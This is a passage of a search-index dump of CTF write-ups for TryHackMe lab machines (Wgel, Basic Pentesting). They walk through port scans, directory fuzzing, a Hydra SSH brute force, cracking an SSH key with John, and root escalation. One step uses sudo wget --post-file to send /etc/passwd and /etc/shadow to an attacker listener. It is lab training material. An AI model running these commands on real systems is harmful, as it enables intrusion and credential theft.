env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jessie may run the following commands on CorpOne: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/wget jessie@CorpOne:~/Documents$ Time for Privesc","title":"3.Exploitation and Foothold"},{"location":"Writeups/2022-07-23-Wgel-CTF/#4privesc","text":"Since I can edit, download and upload any files, I'll try to privesc like this: download /etc/passwd and /etc/shadow files. Modify the root hash to a password of my own choosing, download them into the target machine and then use the modified fils to privesc","title":"4.Privesc"},{"location":"Writeups/2022-07-23-Wgel-CTF/#download-the-files","text":"Start a netcat listener on my machine and output the content to files which I'll edit. jessie@CorpOne:/etc$ sudo /usr/bin/wget --post-file=passwd 10.8.86.252:8080 --2022-07-23 21:43:19-- http://10.8.86.252:8080/ Connecting to 10.8.86.252:8080... connected. HTTP request sent, awaiting response... ^C jessie@CorpOne:/etc$ sudo /usr/bin/wget --post-file=shadow 10.8.86.252:8080 --2022-07-23 21:40:30-- http://10.8.86.252:8080/ Connecting to 10.8.86.252:8080... connected. HTTP request sent, awaiting response... ^C jessie@CorpOne:/etc$","title":"Download the files"},{"location":"Writeups/2022-07-23-Wgel-CTF/#generate-hash-with-openssl","text":"","title":"Generate hash with Openssl"},{"location":"Writeups/2022-07-23-Wgel-CTF/#modify-the-root-hash-on-both-the-passwd-and-shadow-file-i-decided-to-edit-both-just-to-make-sure-there-are-no-hitches","text":"","title":"Modify The root hash on both the passwd and shadow file (I decided to edit both just to make sure there are no hitches)"},{"location":"Writeups/2022-07-23-Wgel-CTF/#passwd-file","text":"","title":"Passwd File"},{"location":"Writeups/2022-07-23-Wgel-CTF/#shadow-file","text":"","title":"Shadow File"},{"location":"Writeups/2022-07-23-Wgel-CTF/#upload-the-files-to-target-and-escalate","text":"","title":"Upload the files to target And Escalate"},{"location":"Writeups/2022-07-23-basic-Pentesting/","text":"TryHackMe easy Machine Q2. Find Services Exposed by the Machine \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm] \u2514\u2500$ cat all_online_ports # Nmap 7.92 scan initiated Sat Jul 23 11:41:56 2022 as: nmap -p- --min-rate 10000 --max-rate 11000 -Pn -oN all_online_ports -v -r 10.10.40.124 Increasing send delay for 10.10.40.124 from 0 to 5 due to 69 out of 229 dropped probes since last increase. Increasing send delay for 10.10.40.124 from 320 to 640 due to 86 out of 285 dropped probes since last increase. Warning: 10.10.40.124 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.40.124 Host is up (0.17s latency). Not shown: 40021 filtered tcp ports (no-response), 25509 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8080/tcp open http-proxy Read data files from: /usr/bin/../share/nmap # Nmap done at Sat Jul 23 11:43:33 2022 -- 1 IP address (1 host up) scanned in 96.68 seconds \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm] \u2514\u2500$ Q3. What is the name of the hidden directory on the web server(enter name without /)? Port 80 \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ ffuf -u http://10.10.40.124/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive <3 ________________________________________________ :: Method : GET :: URL : http://10.10.40.124/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ .htpasswd [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 203ms] .htaccess [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 204ms] .hta [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 209ms] [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 218ms] development [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 291ms] index.html [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 397ms] server-status [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 228ms] :: Progress: [4614/4614] :: Job [1/1] :: 192 req/sec :: Duration: [0:01:19] :: Errors: 1 :: \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm] \u2514\u2500$ Port 8080 \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ ffuf -u http://10.10.40.124:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive <3 ________________________________________________ :: Method : GET :: URL : http://10.10.40.124:8080/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 200, Size: 11228, Words: 4258, Lines: 203, Duration: 179ms] docs [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2756ms] examples [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1498ms] favicon.ico [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 469ms] host-manager [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 707ms] manager [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 234ms] :: Progress: [4614/4614] :: Job [1/1] :: 82 req/sec :: Duration: [0:02:22] :: Errors: 80 :: \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm] \u2514\u2500$ Q4. User brute-forcing to find the username & password Checking the development directory, there is a conversion between a guy going with \"k\" and another \"J\". Obviously these are users and maybe we can use them to bruteforce. However these are their initials and won't help. So now I have to find them. From the port scan, port 445 is open and the smb could provide some info. True enough, i find the names of \"K\" and \"J\" from a file \"staff.txt\" in the smbclient. Staff.txt Announcement to staff: PLEASE do not upload non-work-related items to this share. I know it's all in fun, but this is how mistakes happen. (This means you too, Jan!) -Kay Bruteforcing SSH with Hydra \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ hydra -L users -P ~/Tools/rockyou.txt ssh://10.10.40.124 -t 4 -V -I Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-23 12:19:58 DATA] max 4 tasks per 1 server, overall 4 tasks, 14344400 login tries (l:1/p:14344400), ~3586100 tries per task [DATA] attacking ssh://10.10.40.124:22/ [ATTEMPT] target 10.10.40.124 - login \"Jan\" - pass \"123456\" - 1 of 14344400 [child 0] (0/0) [ATTEMPT] target 10.10.40.124 - login \"Jan\" - pass \"12345\" - 2 of 14344400 [child 1] (0/0) [ATTEMPT] target 10.10.40.124 - login \"Jan\" - pass \"123456789\" - 3 of 14344400 [child 2] (0/0) [ATTEMPT] target 10.10.40.124 - login \"Jan\" - pass \"password\" - 4 of 14344400 [child 3] (0/0) [22][ssh] host: 10.10.40.124 login: jan password: armando 1 of 1 target successfully completed, 1 valid password found Q5.What is the password? armando Q6. What service do you use to access the server(answer in abbreviation in all caps)? SSH Q7. Enumerate the machine to find any vectors for privilege escalation Q8. What is the name of the other user you found(all lower case)? kay Q9. If you have found another user, what can you do with this information? Q10. What is the final password you obtain? In kay's directory I find a file \"pass.bak\" which I think is the answer. However, I can't read the file because I don't have the necessary permissions and I can't run sudo on the machine. Time for privesc...here comes linpeas \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Sudo version \u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version Sudo version 1.8.16 \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 CVEs Check Vulnerable to CVE-2021-4034 sh: 1197: [[: not found sh: 1197: rpm: not found sh: 1197: 0: not found sh: 1207: [[: not found Trying to exploit this vulnerability was futile as I'm running as user Jan who seems to not have the necessary write permissions to create the files neede to escalate. Time to look around... Hehe, I can be able to read kay's private key.I copy the contents. When I try to login using te private_key, turns out it's encrypted and I'm asked for the password. Time to bruteforce with JohnTheRipper to get the password protecting the private key. \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ ssh2john id_rsa > hash \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ john --wordlist=~/Tools/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status beeswax (id_rsa) 1g 0:00:00:04 DONE (2022-07-23 13:15) 0.2183g/s 18068p/s 18068c/s 18068C/s behlat..bammer Use the \"--show\" option to display all of the cracked passwords reliably Session completed. \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ Bingo, now I can login and read the contents of \"pass.bak\" and answer the questions. kay@basic2:~$ ls pass.bak kay@basic2:~$ cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ kay@basic2:~$ I can't leave it like that without privesc Using the password, user Kay can run all commands as sudo kay@basic2:~$ sudo -l Matching Defaults entries for kay on basic2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User kay may run the following commands on basic2: (ALL : ALL) ALL kay@basic2:~$ Privesc kay@basic2:~$ sudo su root@basic2:/home/kay#","title":"2022 07 23 basic Pentesting"},{"location":"Writeups/2022-07-23-basic-Pentesting/#tryhackme-easy-machine","text":"","title":"TryHackMe easy Machine"},{"location":"Writeups/2022-07-23-basic-Pentesting/#q2-find-services-exposed-by-the-machine","text":"\u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm] \u2514\u2500$ cat all_online_ports # Nmap 7.92 scan initiated Sat Jul 23 11:41:56 2022 as: nmap -p- --min-rate 10000 --max-rate 11000 -Pn -oN all_online_ports -v -r 10.10.40.124 Increasing send delay for 10.10.40.124 from 0 to 5 due to 69 out of 229 dropped probes since last increase. Increasing send delay for 10.10.40.124 from 320 to 640 due to 86 out of 285 dropped probes since last increase. Warning: 10.10.40.124 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.40.124 Host is up (0.17s latency). Not shown: 40021 filtered tcp ports (no-response), 25509 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8080/tcp open http-proxy Read data files from: /usr/bin/../share/nmap # Nmap done at Sat Jul 23 11:43:33 2022 -- 1 IP address (1 host up) scanned in 96.68 seconds \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm] \u2514\u2500$","title":"Q2. Find Services Exposed by the Machine"},{"location":"Writeups/2022-07-23-basic-Pentesting/#q3-what-is-the-name-of-the-hidden-directory-on-the-web-serverenter-name-without","text":"","title":"Q3. What is the name of the hidden directory on the web server(enter name without /)?"},{"location":"Writeups/2022-07-23-basic-Pentesting/#port-80","text":"\u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ ffuf -u http://10.10.40.124/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive <3 ________________________________________________ :: Method : GET :: URL : http://10.10.40.124/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ .htpasswd [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 203ms] .htaccess [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 204ms] .hta [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 209ms] [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 218ms] development [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 291ms] index.html [Status: 200, Size: 158, Words: 20, Lines: 11, Duration: 397ms] server-status [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 228ms] :: Progress: [4614/4614] :: Job [1/1] :: 192 req/sec :: Duration: [0:01:19] :: Errors: 1 :: \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm] \u2514\u2500$","title":"Port 80"},{"location":"Writeups/2022-07-23-basic-Pentesting/#port-8080","text":"\u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ ffuf -u http://10.10.40.124:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive <3 ________________________________________________ :: Method : GET :: URL : http://10.10.40.124:8080/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 200, Size: 11228, Words: 4258, Lines: 203, Duration: 179ms] docs [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2756ms] examples [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1498ms] favicon.ico [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 469ms] host-manager [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 707ms] manager [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 234ms] :: Progress: [4614/4614] :: Job [1/1] :: 82 req/sec :: Duration: [0:02:22] :: Errors: 80 :: \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm] \u2514\u2500$","title":"Port 8080"},{"location":"Writeups/2022-07-23-basic-Pentesting/#q4-user-brute-forcing-to-find-the-username-password","text":"Checking the development directory, there is a conversion between a guy going with \"k\" and another \"J\". Obviously these are users and maybe we can use them to bruteforce. However these are their initials and won't help. So now I have to find them. From the port scan, port 445 is open and the smb could provide some info. True enough, i find the names of \"K\" and \"J\" from a file \"staff.txt\" in the smbclient. Staff.txt Announcement to staff: PLEASE do not upload non-work-related items to this share. I know it's all in fun, but this is how mistakes happen. (This means you too, Jan!) -Kay Bruteforcing SSH with Hydra \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ hydra -L users -P ~/Tools/rockyou.txt ssh://10.10.40.124 -t 4 -V -I Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-23 12:19:58 DATA] max 4 tasks per 1 server, overall 4 tasks, 14344400 login tries (l:1/p:14344400), ~3586100 tries per task [DATA] attacking ssh://10.10.40.124:22/ [ATTEMPT] target 10.10.40.124 - login \"Jan\" - pass \"123456\" - 1 of 14344400 [child 0] (0/0) [ATTEMPT] target 10.10.40.124 - login \"Jan\" - pass \"12345\" - 2 of 14344400 [child 1] (0/0) [ATTEMPT] target 10.10.40.124 - login \"Jan\" - pass \"123456789\" - 3 of 14344400 [child 2] (0/0) [ATTEMPT] target 10.10.40.124 - login \"Jan\" - pass \"password\" - 4 of 14344400 [child 3] (0/0) [22][ssh] host: 10.10.40.124 login: jan password: armando 1 of 1 target successfully completed, 1 valid password found","title":"Q4. User brute-forcing to find the username &amp; password"},{"location":"Writeups/2022-07-23-basic-Pentesting/#q5what-is-the-password","text":"armando","title":"Q5.What is the password?"},{"location":"Writeups/2022-07-23-basic-Pentesting/#q6-what-service-do-you-use-to-access-the-serveranswer-in-abbreviation-in-all-caps","text":"SSH","title":"Q6. What service do you use to access the server(answer in abbreviation in all caps)?"},{"location":"Writeups/2022-07-23-basic-Pentesting/#q7-enumerate-the-machine-to-find-any-vectors-for-privilege-escalation","text":"","title":"Q7. Enumerate the machine to find any vectors for privilege escalation"},{"location":"Writeups/2022-07-23-basic-Pentesting/#q8-what-is-the-name-of-the-other-user-you-foundall-lower-case","text":"kay","title":"Q8. What is the name of the other user you found(all lower case)?"},{"location":"Writeups/2022-07-23-basic-Pentesting/#q9-if-you-have-found-another-user-what-can-you-do-with-this-information","text":"","title":"Q9. If you have found another user, what can you do with this information?"},{"location":"Writeups/2022-07-23-basic-Pentesting/#q10-what-is-the-final-password-you-obtain","text":"In kay's directory I find a file \"pass.bak\" which I think is the answer. However, I can't read the file because I don't have the necessary permissions and I can't run sudo on the machine. Time for privesc...here comes linpeas \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Sudo version \u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version Sudo version 1.8.16 \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 CVEs Check Vulnerable to CVE-2021-4034 sh: 1197: [[: not found sh: 1197: rpm: not found sh: 1197: 0: not found sh: 1207: [[: not found Trying to exploit this vulnerability was futile as I'm running as user Jan who seems to not have the necessary write permissions to create the files neede to escalate. Time to look around... Hehe, I can be able to read kay's private key.I copy the contents. When I try to login using te private_key, turns out it's encrypted and I'm asked for the password. Time to bruteforce with JohnTheRipper to get the password protecting the private key. \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ ssh2john id_rsa > hash \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ john --wordlist=~/Tools/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status beeswax (id_rsa) 1g 0:00:00:04 DONE (2022-07-23 13:15) 0.2183g/s 18068p/s 18068c/s 18068C/s behlat..bammer Use the \"--show\" option to display all of the cracked passwords reliably Session completed. \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/BasicPentesting] \u2514\u2500$ Bingo, now I can login and read the contents of \"pass.bak\" and answer the questions. kay@basic2:~$ ls pass.bak kay@basic2:~$ cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ kay@basic2:~$ I can't leave it like that without privesc Using the password, user Kay can run all commands as sudo kay@basic2:~$ sudo -l Matching Defaults entries for kay on basic2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User kay may run the following commands on basic2: (ALL : ALL) ALL kay@basic2:~$","title":"Q10. What is the final password you obtain?"},{"location":"Writeups/2022-07-23-basic-Pentesting/#privesc","text":"kay@basic2:~$ sudo su root@basic2:/home/kay#","title":"Privesc"}]}